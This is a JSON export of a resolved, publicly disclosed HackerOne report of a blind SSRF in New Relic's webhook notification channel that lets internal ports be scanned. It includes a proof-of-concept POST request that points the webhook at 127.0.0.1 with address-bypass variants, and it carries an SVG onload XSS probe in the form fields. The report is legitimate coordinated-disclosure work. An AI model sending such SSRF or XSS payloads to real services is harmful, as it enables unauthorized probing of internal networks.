{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-09-11T13:08:15.251Z", 
    "voters": [
        "sp1d3rs", 
        "malcolmx", 
        "eveeez", 
        "axolotl", 
        "m16", 
        "alfredsaonoy", 
        "japz", 
        "zerotoone", 
        "smit", 
        "niced4y", 
        "and 1 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 263169, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Internal Ports Scanning via Blind SSRF", 
    "is_member_of_team?": null, 
    "vote_count": 11, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-10-11T13:08:15.280Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "Screen_Shot_2017-08-25_at_4.47.15_PM.png", 
            "type": "image/png", 
            "id": 215718, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/215/718/b4f29254b018958e24b4803474f62142fab025b6/Screen_Shot_2017-08-25_at_4.47.15_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223144Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cc3088735bc9d632af34bc9be4894b557faa1b46bd2ec58aef79b027f5511080"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-08-25T09:10:49.071Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-25T09:10:49.071Z", 
            "actor": {
                "username": "tungpun", 
                "url": "/tungpun", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/074/643/5251b26db8329f8f87d1440aff3cb78c7226bc99_medium.png?1491447171"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "Internal Ports Scanning via Blind SSRF", 
                "old_title": "Internal Port Scanning via Blind SSRF"
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 1953963, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-25T22:04:15.087Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-25T22:04:15.087Z", 
            "actor": {
                "username": "ahamlin", 
                "url": "/ahamlin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/071/f64610f48ed92d78a126cc855754c0aaef4beaee_medium.jpg?1507763206"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thank you for your report! This is a great find \u2013 I have reproduced the issue, and triaged it with the appropriate engineering team. We will keep you updated on its remediation progress!\n\nAs a token of our thanks, you can follow this link to choose a size and shipping address for a New Relic t-shirt! Thank you so much for helping keep New Relic secure. http://get.printfection.com/ztwfh/4974674756/jkkfbknhhy", 
            "markdown_message": "<p>Thank you for your report! This is a great find \u2013 I have reproduced the issue, and triaged it with the appropriate engineering team. We will keep you updated on its remediation progress!</p>\n\n<p>As a token of our thanks, you can follow this link to choose a size and shipping address for a New Relic t-shirt! Thank you so much for helping keep New Relic secure. <a title=\"http://get.printfection.com/ztwfh/4974674756/jkkfbknhhy\" href=\"/redirect?signature=69840ff1be4fdfbde42a9a18a6e17fa1e1ae969c&amp;url=http%3A%2F%2Fget.printfection.com%2Fztwfh%2F4974674756%2Fjkkfbknhhy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://get.printfection.com/ztwfh/4974674756/jkkfbknhhy</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1956056, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-26T02:42:05.033Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-26T02:42:05.033Z", 
            "actor": {
                "username": "tungpun", 
                "url": "/tungpun", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/074/643/5251b26db8329f8f87d1440aff3cb78c7226bc99_medium.png?1491447171"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Thanks for the swag. Hope you will fix this issue soon.", 
            "markdown_message": "<p>Thanks for the swag. Hope you will fix this issue soon.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1956324, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "tungpun", 
                "url": "/tungpun"
            }, 
            "created_at": "2017-09-11T13:02:22.373Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-11T13:02:22.373Z", 
            "actor": {
                "username": "ahamlin", 
                "url": "/ahamlin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/071/f64610f48ed92d78a126cc855754c0aaef4beaee_medium.jpg?1507763206"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "We believe this issue to be resolved. Thanks very much for reporting it to us, we really appreciate your help keeping New Relic and its customers secure!", 
            "markdown_message": "<p>We believe this issue to be resolved. Thanks very much for reporting it to us, we really appreciate your help keeping New Relic and its customers secure!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1988925, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-11T13:07:46.074Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-11T13:07:46.074Z", 
            "actor": {
                "username": "tungpun", 
                "url": "/tungpun", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/074/643/5251b26db8329f8f87d1440aff3cb78c7226bc99_medium.png?1491447171"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "message": "Great to hear that this case has been fixed. Could we disclosure ?", 
            "markdown_message": "<p>Great to hear that this case has been fixed. Could we disclosure ?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1988953, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-11T13:08:15.267Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-11T13:08:15.267Z", 
            "actor": {
                "username": "tungpun", 
                "url": "/tungpun", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/074/643/5251b26db8329f8f87d1440aff3cb78c7226bc99_medium.png?1491447171"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "newrelic", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1988956, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-10-11T13:08:21.599Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-10-11T13:08:21.599Z", 
            "actor": {
                "url": "/newrelic", 
                "profile": {
                    "name": "New Relic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
                }
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2058744, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-03T03:35:10.615Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-03T03:35:10.615Z", 
            "actor": {
                "url": "/newrelic", 
                "profile": {
                    "name": "New Relic"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
                }
            }, 
            "team_handle": "newrelic", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 2694291, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "tungpun", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/tungpun", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/074/643/e15300a7f7f532a78c384d24fe3793f9278a68fe_small.png?1491447171"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -36408209.182807244, 
    "disclosed_at": "2017-10-11T13:08:21.562Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/263169", 
    "created_at": "2017-08-25T09:10:34.562Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"introduction\">Introduction:</h2>\n\n<p>I found a Blind SSRF issue that allows scanning internal ports.</p>\n\n<h2 id=\"how-to-reproduce\">How to reproduce:</h2>\n\n<ul>\n<li><p>Go to <br>\n<code>https://rpm.newrelic.com/accounts/&lt;acc_id&gt;/notification_channels?type=WebhookIntegration</code><br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-08-25_at_4.47.15_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/215/718/b4f29254b018958e24b4803474f62142fab025b6/Screen_Shot_2017-08-25_at_4.47.15_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223144Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cc3088735bc9d632af34bc9be4894b557faa1b46bd2ec58aef79b027f5511080\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/215/718/b4f29254b018958e24b4803474f62142fab025b6/Screen_Shot_2017-08-25_at_4.47.15_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223144Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=cc3088735bc9d632af34bc9be4894b557faa1b46bd2ec58aef79b027f5511080\" class=\"markdown-inline-image\"></a></p></li>\n<li><p>Fill the input. In the web hook URL section, fill: <code>http://&lt;internal_hostname&gt;:&lt;port&gt;/</code>.</p></li>\n<li><p>Send the request.</p></li>\n</ul>\n\n<p>Look up the response. If valid, it will return status code 200, or 422 for otherwise.<br>\nFor demonstration, I try scanning the <code>localhost</code> with a limited port range, then found an available port <code>4352</code>.</p>\n\n<p>And here is the PoC:</p>\n<pre class=\"highlight plaintext\"><code>POST /accounts/1723471/notification_channels?type=WebhookIntegration HTTP/1.1\n\nutf8=%E2%9C%93&amp;authenticity_token=i%2FxIU01NWUoCx92w1%2FmilEwulU1SjUGSKsJR8ARB4CQ%3D&amp;webhook_integration%5Bname%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E&amp;webhook_integration%5Bwebhook_url%5D=http://127.0.0.1:4352/&amp;webhook_integration%5Bdescription%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E&amp;webhook_integration%5Bverbosity%5D=default&amp;webhook_integration%5Benabled%5D=true\n</code></pre>\n<p>As the filter does not validate the input, it allows the attacker to make the GET request to the internal network.<br>\nI tried replacing <code>http://127.0.0.1:4352/</code> by <code>http://0:4352/</code> and <code>http://127.0.0.1:4352/?test=aaaaaaa</code>, it still works.</p>\n\n<p>In conclusion, I think internal addresses should not be allowed.</p>\n", 
    "vulnerability_information": "## Introduction:\n\nI found a Blind SSRF issue that allows scanning internal ports.\n\n## How to reproduce:\n\n* Go to \n`https://rpm.newrelic.com/accounts/<acc_id>/notification_channels?type=WebhookIntegration`\n{F215718}\n\n* Fill the input. In the web hook URL section, fill: `http://<internal_hostname>:<port>/`.\n\n* Send the request.\n\nLook up the response. If valid, it will return status code 200, or 422 for otherwise.\nFor demonstration, I try scanning the `localhost` with a limited port range, then found an available port `4352`.\n\nAnd here is the PoC:\n\n```\nPOST /accounts/1723471/notification_channels?type=WebhookIntegration HTTP/1.1\n\nutf8=%E2%9C%93&authenticity_token=i%2FxIU01NWUoCx92w1%2FmilEwulU1SjUGSKsJR8ARB4CQ%3D&webhook_integration%5Bname%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E&webhook_integration%5Bwebhook_url%5D=http://127.0.0.1:4352/&webhook_integration%5Bdescription%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E&webhook_integration%5Bverbosity%5D=default&webhook_integration%5Benabled%5D=true\n```\n\nAs the filter does not validate the input, it allows the attacker to make the GET request to the internal network.\nI tried replacing `http://127.0.0.1:4352/` by `http://0:4352/` and `http://127.0.0.1:4352/?test=aaaaaaa`, it still works.\n\nIn conclusion, I think internal addresses should not be allowed.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://newrelic.com", 
            "about": "New Relic's Coordinated Disclosure Program", 
            "twitter_handle": "newrelic", 
            "name": "New Relic"
        }, 
        "handle": "newrelic", 
        "url": "https://hackerone.com/newrelic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/011/4a259e2f731f105c784b1279db99215cefb8abbd_small.?1482361910", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 17011, 
        "default_currency": "usd"
    }, 
    "is_published": false
}